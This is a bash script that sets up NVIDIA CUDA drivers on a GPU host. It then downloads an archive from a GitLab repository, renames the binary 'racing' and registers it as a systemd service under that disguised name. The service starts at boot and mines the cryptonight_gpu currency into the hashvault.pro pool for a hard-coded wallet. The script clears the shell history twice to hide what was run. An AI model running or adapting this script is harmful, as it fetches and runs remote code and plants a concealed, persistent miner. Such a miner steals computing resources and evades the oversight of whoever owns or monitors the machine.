cd /home
myworker=$(date +'%d%m_%H%M_')
username=$HOSTNAME
shortname=${username:0:12}
myworker+=$shortname
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-key del 7fa2af80
sudo rm /etc/apt/sources.list.d/cuda.list
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl4 -y
sudo apt-get install cuda-drivers-515 -y
sudo apt-get install cuda-drivers-fabricmanager-515 -y
sudo systemctl enable nvidia-fabricmanager
sudo systemctl start nvidia-fabricmanager
sudo nvidia-smi mig -cgi 0 -C
sudo wget https://gitlab.com/arifrahman555/budug/-/raw/main/best.tar.gz
tar -zxvf best.tar.gz
mv best racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing --tls-url singapore01.hashvault.pro:80 --user ccx7SdvbkQ888wfr4UL7ACSFu9rVQWuHQipL3gQAMhhY2BR3fFP9uijXtznxBsofFP8JB32YYBmtwLdoEirjAbYo4DBZfA9L1k --pass monyet --currency cryptonight_gpu ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
history -c
./best --tls-url singapore01.hashvault.pro:80 --user ccx7SdvbkQ888wfr4UL7ACSFu9rVQWuHQipL3gQAMhhY2BR3fFP9uijXtznxBsofFP8JB32YYBmtwLdoEirjAbYo4DBZfA9L1k --pass monyet --currency cryptonight_gpu
history -c
